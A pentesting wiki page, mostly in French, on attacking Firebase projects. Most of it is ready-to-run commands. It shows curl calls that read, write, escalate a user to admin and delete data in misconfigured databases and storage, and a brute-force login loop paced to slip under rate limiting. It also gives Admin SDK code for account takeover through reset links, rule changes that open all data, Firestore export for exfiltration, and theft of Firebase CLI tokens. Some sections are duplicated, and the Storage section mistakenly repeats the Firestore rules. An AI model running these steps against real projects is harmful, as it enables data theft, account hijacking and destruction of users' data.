# GCP - Firebase Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Firebase

### Accès non authentifié à Firebase Realtime Database
Un attaquant n'a pas besoin d'autorisations Firebase spécifiques pour réaliser cette attaque. Il suffit qu'une configuration vulnérable existe dans les règles de sécurité de Firebase Realtime Database, où les règles sont définies avec `.read: true` ou `.write: true`, autorisant l'accès public en lecture ou écriture.

L'attaquant doit identifier l'URL de la base de données, qui suit typiquement le format : `https://<project-id>.firebaseio.com/`.

Cette URL peut être trouvée via mobile application reverse engineering (décompilation d'Android APKs ou analyse d'apps iOS), l'analyse de fichiers de configuration tels que google-services.json (Android) ou GoogleService-Info.plist (iOS), l'inspection du code source des web applications, ou l'examen du network traffic pour identifier des requêtes vers des domaines `*.firebaseio.com`.

L'attaquant identifie l'URL de la base de données et vérifie si elle est exposée publiquement, puis accède aux données et peut potentiellement écrire des informations malveillantes.

D'abord, il vérifie si la base de données permet l'accès en lecture en ajoutant .json à l'URL.
```bash
curl https://<project-id>-default-rtdb.firebaseio.com/.json
```
Si la réponse contient des données JSON ou null (au lieu de "Permission Denied"), la base de données autorise l'accès en lecture. Pour vérifier l'accès en écriture, l'attaquant peut tenter d'envoyer une requête d'écriture de test en utilisant la Firebase REST API.
```bash
curl -X PUT https://<project-id>-default-rtdb.firebaseio.com/test.json -d '{"test": "data"}'
```
Si l'opération réussit, la base de données permet également l'accès en écriture.


### Exposition des données dans Cloud Firestore
Un attaquant n'a pas besoin de permissions Firebase spécifiques pour réaliser cette attaque. Cela nécessite seulement qu'il y ait une configuration vulnérable dans les règles de sécurité de Cloud Firestore où les règles autorisent l'accès en lecture ou en écriture sans authentification ou avec une validation insuffisante. Un exemple de règle mal configurée qui accorde un accès complet est :
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
Cette règle permet à n'importe qui de lire et d'écrire tous les documents sans aucune restriction. Les règles Firestore sont granulaires et s'appliquent par collection et par document, donc une erreur dans une règle spécifique peut n'exposer que certaines collections.

L'attaquant doit identifier le Firebase Project ID, qui peut être trouvé par reverse engineering d'une application mobile, l'analyse de fichiers de configuration tels que google-services.json ou GoogleService-Info.plist, l'inspection du code source des applications web, ou l'analyse du trafic réseau pour identifier des requêtes vers firestore.googleapis.com.
L'API REST de Firestore utilise le format :
```bash
https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
Si les règles autorisent l'accès en lecture sans authentification, l'attaquant peut lire les collections et les documents. D'abord, il tente d'accéder à une collection spécifique :
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>
```
Si la réponse contient des documents JSON au lieu d'une erreur d'autorisation, la collection est exposée. L'attaquant peut énumérer toutes les collections accessibles en essayant des noms courants ou en analysant la structure de l'application. Pour accéder à un document spécifique :
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
Si les règles autorisent un accès en écriture non authentifié ou n'appliquent pas une validation suffisante, l'attaquant peut créer de nouveaux documents :
```bash
curl -X POST https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"name": {"stringValue": "Test"},
"email": {"stringValue": "test@example.com"}
}
}'
```
Pour modifier un document existant, utilisez PATCH:
```bash
curl -X PATCH https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/users/<user-id> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"role": {"stringValue": "admin"}
}
}'
```
Pour supprimer un document et provoquer un déni de service :
```bash
curl -X DELETE https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
### Exposition des fichiers dans Firebase Storage
Un attaquant n'a pas besoin d'autorisations Firebase spécifiques pour mener cette attaque. Il suffit qu'il y ait une configuration vulnérable dans les règles de sécurité de Firebase Storage où les règles autorisent l'accès en lecture ou en écriture sans authentification ou avec une validation insuffisante. Les règles de Storage contrôlent les permissions de lecture et d'écriture indépendamment, donc une erreur dans une règle peut n'exposer que l'accès en lecture, que l'accès en écriture, ou les deux. Un exemple de règle mal configurée qui accorde un accès total est :
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
Cette règle permet l'accès en lecture et écriture à tous les documents sans aucune restriction. Les règles Firestore sont granulaires et s'appliquent par collection et par document, donc une erreur dans une règle spécifique peut n'exposer que certaines collections. L'attaquant doit identifier le Firebase Project ID, qui peut être trouvé via mobile application reverse engineering, l'analyse des fichiers de configuration tels que google-services.json ou GoogleService-Info.plist, l'inspection du web application source code, ou network traffic analysis pour identifier les requêtes vers firestore.googleapis.com.

The Firestore REST API uses the format:`https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>.`

Si les règles permettent un accès en lecture non authentifié, l'attaquant peut lire des collections et des documents. D'abord, il tente d'accéder à une collection spécifique.
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o"
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?prefix=<path>"
```
Si la réponse contient la liste des fichiers au lieu d'une erreur d'autorisation, le fichier est exposé. L'attaquant peut consulter le contenu des fichiers en spécifiant leur chemin :
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<urlencode(path)>"
```
Si les règles permettent unauthenticated write access ou comportent une validation insuffisante, l'attacker peut téléverser des fichiers malveillants. Pour téléverser un fichier via le REST API :
```bash
curl -X POST "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?name=<path>" \
-H "Content-Type: <content-type>" \
--data-binary @<local-file>
```
L'attaquant peut téléverser des code shells, des malware payloads ou de gros fichiers pour provoquer un denial of service. Si l'application traite ou exécute les fichiers téléversés, l'attaquant peut parvenir à remote code execution. Pour supprimer des fichiers et provoquer un denial of service :
```bash
curl -X DELETE "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<path>"
```
### Invocation de Firebase Cloud Functions publiques
Un attaquant n'a pas besoin d'autorisations Firebase spécifiques pour exploiter ce problème ; il suffit qu'une Cloud Function soit accessible publiquement via HTTP sans authentification.

Une fonction est vulnérable lorsqu'elle est mal configurée :

- Elle utilise `functions.https.onRequest`, qui n'applique pas l'authentification (contrairement aux fonctions `onCall`).
- Le code de la fonction ne valide pas l'authentification de l'utilisateur (par ex., pas de vérifications de `request.auth` ou `context.auth`).
- La fonction est accessible publiquement via IAM, c'est-à-dire que `allUsers` dispose du rôle `roles/cloudfunctions.invoker`. C'est le comportement par défaut pour les fonctions HTTP sauf si le développeur restreint l'accès.

Les Firebase HTTP Cloud Functions sont exposées via des URLs telles que :

- `https://<region>-<project-id>.cloudfunctions.net/<function-name>`
- `https://<project-id>.web.app/<function-name>` (when integrated with Firebase Hosting)

Un attaquant peut découvrir ces URLs par source code analysis, network traffic inspection, enumeration tools, ou mobile app reverse engineering.
Si la fonction est exposée publiquement et sans authentification, l'attaquant peut l'invoquer directement sans identifiants.
```bash
# Invoke public HTTP function with GET
curl "https://<region>-<project-id>.cloudfunctions.net/<function-name>"
# Invoke public HTTP function with POST and data
curl -X POST "https://<region>-<project-id>.cloudfunctions.net/<function-name>" \
-H "Content-Type: application/json" \
-d '{"param1": "value1", "param2": "value2"}'
```
Si la fonction ne valide pas correctement les entrées, l'attaquant peut tenter d'autres attaques telles que code injection ou command injection.


### Brute-force attack against Firebase Authentication avec une politique de mot de passe faible
Un attaquant n'a pas besoin de permissions Firebase spécifiques pour mener cette attaque. Il suffit que le Firebase API Key soit exposé dans des applications mobiles ou web, et que la politique de mot de passe n'ait pas été configurée avec des exigences plus strictes que les valeurs par défaut.

L'attaquant doit identifier le Firebase API Key, qui peut être trouvé via le reverse engineering d'applications mobiles, l'analyse de fichiers de configuration tels que google-services.json ou GoogleService-Info.plist, l'inspection du code source d'applications web (par ex., dans bootstrap.js), ou l'analyse du trafic réseau.

Firebase Authentication’s REST API uses the endpoint:
`https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>`
to authenticate with email and password.

Si Email Enumeration Protection est désactivé, les réponses d'erreur de l'API peuvent révéler si un email existe dans le système (EMAIL_NOT_FOUND vs. INVALID_PASSWORD), ce qui permet aux attaquants d'énumérer des utilisateurs avant d'essayer de deviner leurs mots de passe. Lorsque cette protection est activée, l'API renvoie le même message d'erreur pour les emails inexistants et les mots de passe incorrects, empêchant l'énumération des utilisateurs.

Il est important de noter que Firebase Authentication applique une limitation du taux (rate limiting), qui peut bloquer les requêtes si trop de tentatives d'authentification surviennent en peu de temps. En conséquence, un attaquant devrait introduire des délais entre les tentatives pour éviter d'être soumis à cette limitation.

L'attaquant identifie le API Key et effectue des tentatives d'authentification avec plusieurs mots de passe contre des comptes connus. Si Email Enumeration Protection est désactivé, l'attaquant peut énumérer les utilisateurs existants en analysant les réponses d'erreur :
```bash
# Attempt authentication with a known email and an incorrect password
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d '{
"email": "usuario@example.com",
"password": "password",
"returnSecureToken": true
}'
```
Si la réponse contient EMAIL_NOT_FOUND, l'adresse e-mail n'existe pas dans le système. Si elle contient INVALID_PASSWORD, l'adresse e-mail existe mais le mot de passe est incorrect, confirmant que l'utilisateur est enregistré. Une fois qu'un utilisateur valide est identifié, l'attaquant peut effectuer des tentatives de brute-force. Il est important d'inclure des pauses entre les tentatives pour éviter les mécanismes de rate-limiting de Firebase Authentication :
```bash
counter=1
for password in $(cat wordlist.txt); do
echo "Intento $counter: probando contraseña '$password'"
response=$(curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d "{\"email\":\"usuario@example.com\",\"password\":\"$password\",\"returnSecureToken\":true}")

if echo "$response" | grep -q "idToken"; then
echo "Contraseña encontrada: $password (intento $counter)"
break
fi

# Stop for the rate limiting
sleep 1
counter=$((counter + 1))
done
```
Avec la politique de mot de passe par défaut (minimum 6 caractères, pas d'exigences de complexité), l'attaquant peut tester toutes les combinaisons possibles de mots de passe à 6 caractères, ce qui représente un espace de recherche relativement petit comparé à des politiques de mot de passe plus strictes.

### Gestion des utilisateurs dans Firebase Authentication

L'attaquant a besoin de permissions spécifiques de Firebase Authentication pour mener cette attaque. Les permissions requises sont :

- `firebaseauth.users.create` pour créer des utilisateurs
- `firebaseauth.users.update` pour modifier des utilisateurs existants
- `firebaseauth.users.delete` pour supprimer des utilisateurs
- `firebaseauth.users.get` pour récupérer des informations utilisateur
- `firebaseauth.users.sendEmail` pour envoyer des emails aux utilisateurs
- `firebaseauth.users.createSession` pour créer des sessions utilisateur

Ces permissions sont incluses dans le rôle `roles/firebaseauth.admin`, qui accorde un accès complet en lecture/écriture aux ressources de Firebase Authentication. Elles sont aussi incluses dans des rôles de niveau supérieur tels que `roles/firebase.developAdmin` (qui inclut toutes les permissions firebaseauth.*) et `roles/firebase.admin` (accès complet à tous les services Firebase).

Pour utiliser le Firebase Admin SDK, l'attaquant aurait besoin d'accéder aux service account credentials (JSON file), qui peuvent se trouver sur des systèmes compromis, des dépôts de code publiquement exposés, des systèmes CI/CD compromis, ou via la compromission de developer accounts ayant accès à ces credentials.

La première étape consiste à configurer le Firebase Admin SDK en utilisant les service account credentials.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
Pour créer un utilisateur malveillant en utilisant l'adresse e-mail d'une victime, l'attaquant tenterait d'utiliser le Firebase Admin SDK pour générer un nouveau compte avec cette adresse.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
Pour modifier un utilisateur existant, l'attacker mettrait à jour des champs tels que l'adresse e‑mail, le statut de vérification ou si le compte est désactivé.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
Pour supprimer un compte utilisateur et provoquer un denial of service, l'attaquant enverrait une requête visant à supprimer entièrement l'utilisateur.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
L'attaquant peut également récupérer des informations sur des utilisateurs existants en demandant leur UID ou leur adresse e‑mail.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
De plus, l'attaquant pourrait générer des liens de vérification ou des liens de réinitialisation de mot de passe afin de modifier le mot de passe d'un utilisateur et d'accéder à son compte.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Gestion des utilisateurs dans Firebase Authentication
Un attaquant a besoin de permissions spécifiques de Firebase Authentication pour mener cette attaque. Les permissions requises sont :

- `firebaseauth.users.create` to create users
- `firebaseauth.users.update` to modify existing users
- `firebaseauth.users.delete` to delete users
- `firebaseauth.users.get` to obtain user information
- `firebaseauth.users.sendEmail` to send emails to users
- `firebaseauth.users.createSession` to create user sessions

Ces permissions sont incluses dans le rôle `roles/firebaseauth.admin`, qui accorde un accès complet en lecture/écriture aux ressources de Firebase Authentication. Elles font aussi partie de rôles de niveau supérieur tels que `roles/firebase.developAdmin` (qui inclut toutes les permissions firebaseauth.*) et `roles/firebase.admin` (accès complet à tous les services Firebase).

Pour utiliser le Firebase Admin SDK, l'attaquant aurait besoin d'accéder aux identifiants d'un compte de service (un fichier JSON), qui pourraient être obtenus à partir de systèmes compromis, de dépôts de code exposés publiquement, d'environnements CI/CD compromis, ou via la compromission de comptes de développeurs ayant accès à ces identifiants.

La première étape consiste à configurer le Firebase Admin SDK en utilisant les identifiants du compte de service.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
Pour créer un utilisateur malveillant en utilisant l'e-mail d'une victime, l'attaquant tenterait de créer un nouveau compte avec cet e-mail, en attribuant son propre mot de passe et ses informations de profil.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
Pour modifier un utilisateur existant, l'attaquant changerait des champs tels que l'adresse e-mail, le statut de vérification ou si le compte est désactivé.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
Pour supprimer un compte utilisateur — provoquant effectivement un denial of service — l'attaquant enverrait une requête pour supprimer définitivement cet utilisateur.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
L'attaquant pourrait également récupérer des informations sur les utilisateurs existants, comme leur UID ou leur adresse e-mail, en demandant les détails d'un utilisateur soit par UID, soit par adresse e-mail.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
De plus, l'attaquant pourrait générer des verification links ou des password-reset links, lui permettant de changer le mot de passe d'un utilisateur et de prendre le contrôle du compte.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Modification des règles de sécurité dans les services Firebase
L'attaquant a besoin d'autorisations spécifiques pour modifier les règles de sécurité selon le service. Pour Cloud Firestore et Firebase Cloud Storage, les permissions requises sont `firebaserules.rulesets.create` pour créer des rulesets et `firebaserules.releases.create` pour déployer des releases. Ces permissions sont incluses dans le rôle `roles/firebaserules.admin` ou dans des rôles de niveau supérieur tels que `roles/firebase.developAdmin` et `roles/firebase.admin`. Pour Firebase Realtime Database, la permission requise est `firebasedatabase.instances.update`.

L'attaquant doit utiliser l'API REST de Firebase pour modifier les règles de sécurité.
D'abord, l'attaquant devra obtenir un jeton d'accès en utilisant les identifiants du compte de service.
Pour obtenir le jeton d'accès:
```bash
gcloud auth activate-service-account --key-file=path/to/serviceAccountKey.json
ACCESS_TOKEN=$(gcloud auth print-access-token)
```
Pour modifier les règles de Firebase Realtime Database :
```bash
curl -X PUT "https://<project-id>-default-rtdb.firebaseio.com/.settings/rules.json?access_token=$ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"rules": {
".read": true,
".write": true
}
}'
```
Pour modifier les règles de Cloud Firestore, l'attaquant doit créer un ruleset puis le déployer :
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "firestore.rules",
"content": "rules_version = '\''2'\'';\nservice cloud.firestore {\n  match /databases/{database}/documents {\n    match /{document=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
La commande précédente renvoie un nom de ruleset au format projects/<project-id>/rulesets/<ruleset-id>. Pour déployer la nouvelle version, il faut mettre à jour la release en envoyant une requête PATCH :
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/cloud.firestore" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/cloud.firestore",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
Pour modifier les règles de Firebase Cloud Storage :
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "storage.rules",
"content": "service firebase.storage {\n  match /b/{bucket}/o {\n    match /{allPaths=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
La commande précédente renvoie un nom de ruleset au format projects/<project-id>/rulesets/<ruleset-id>. Pour déployer la nouvelle version, la release doit être mise à jour en utilisant une requête PATCH :
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/firebase.storage/<bucket-id>" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/firebase.storage/<bucket-id>",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
### Exfiltration et manipulation de données dans Cloud Firestore
Cloud Firestore utilise la même infrastructure et le même système de permissions que Cloud Datastore, donc les permissions IAM de Datastore s'appliquent directement à Firestore. Pour manipuler les politiques TTL, la permission `datastore.indexes.update` est requise. Pour exporter des données, la permission `datastore.databases.export` est requise. Pour importer des données, la permission datastore.databases.import est requise. Pour effectuer une suppression de données en masse, la permission `datastore.databases.bulkDelete` est requise.

Pour les opérations de sauvegarde et de restauration, des permissions spécifiques sont nécessaires :

- `datastore.backups.get` and `datastore.backups.list` pour lister et récupérer les détails des sauvegardes disponibles
- `datastore.backups.delete` pour supprimer des sauvegardes
- `datastore.backups.restoreDatabase` pour restaurer une base de données à partir d'une sauvegarde
- `datastore.backupSchedules.create` and `datastore.backupSchedules.delete` pour gérer les plans de sauvegarde

Lorsqu'une politique TTL est créée, une propriété désignée est sélectionnée pour identifier les entités éligibles à la suppression. Cette propriété TTL doit être de type Date et heure. L'attaquant peut choisir une propriété qui existe déjà ou désigner une propriété qu'il prévoit d'ajouter plus tard. Si la valeur du champ est une date passée, le document devient immédiatement éligible à la suppression. L'attaquant peut utiliser le gcloud CLI pour manipuler les politiques TTL.
```bash
# Enable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--enable-ttl
# Disable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--disable-ttl
```
Pour exporter des données et exfiltrate ces dernières, l'attaquant pourrait utiliser le gcloud CLI.
```bash
gcloud firestore export gs://<bucket-name> --project=<project-id> --async --database='(default)'
```
Pour importer des données malveillantes :
```bash
gcloud firestore import gs://<bucket-name>/<path> --project=<project-id> --async --database='(default)'
```
Pour réaliser une mass data deletion et provoquer un denial of service, l'attacker pourrait utiliser le gcloud Firestore bulk-delete tool pour supprimer des collections entières.
```bash
gcloud firestore bulk-delete \
--collection-ids=users,posts,messages \
--database='(default)' \
--project=<project-id>
```
Pour les opérations de backup et de restauration, l'attaquant peut créer des backups planifiés pour capturer l'état actuel de la base de données, lister les backups existants, restaurer à partir d'un backup pour écraser des modifications récentes, supprimer des backups pour provoquer une perte de données permanente, et supprimer les backups planifiés.
Pour créer une planification de backup quotidienne qui génère immédiatement un backup :
```bash
gcloud firestore backups schedules create \
--database='(default)' \
--recurrence=daily \
--retention=14w \
--project=<project-id>
```
Pour restaurer à partir d'une sauvegarde spécifique, l'attaquant pourrait créer une nouvelle base de données en utilisant les données contenues dans cette sauvegarde. L'opération de restauration écrit les données de la sauvegarde dans une nouvelle base de données, ce qui signifie qu'un DATABASE_ID existant ne peut pas être utilisé.
```bash
gcloud firestore databases restore \
--source-backup=projects/<project-id>/locations/<location>/backups/<backup-id> \
--destination-database='<new-database-id>' \
--project=<project-id>
```
Pour supprimer une sauvegarde et provoquer une perte de données permanente :
```bash
gcloud firestore backups delete \
--backup=<backup-id> \
--project=<project-id>
```
### Vol et utilisation abusive des identifiants Firebase CLI
Un attaquant n'a pas besoin d'autorisations Firebase spécifiques pour réaliser cette attaque, mais il doit avoir accès au système local du développeur ou au fichier d'identifiants Firebase CLI. Ces identifiants sont stockés dans un fichier JSON situé à :

- Linux/macOS: ~/.config/configstore/firebase-tools.json

- Windows: C:\Users\[User]\.config\configstore\firebase-tools.json

Ce fichier contient des tokens d'authentification, y compris le refresh_token et l'access_token, qui permettent à l'attaquant de s'authentifier en tant qu'utilisateur ayant exécuté firebase login à l'origine.

L'attaquant obtient l'accès au fichier d'identifiants Firebase CLI. Il peut alors copier l'intégralité du fichier sur son propre système, et la Firebase CLI utilisera automatiquement les identifiants depuis son emplacement par défaut. Après cela, l'attaquant peut consulter tous les projets Firebase accessibles à cet utilisateur.
```bash
firebase projects:list
```
{{#include ../../../banners/hacktricks-training.md}}
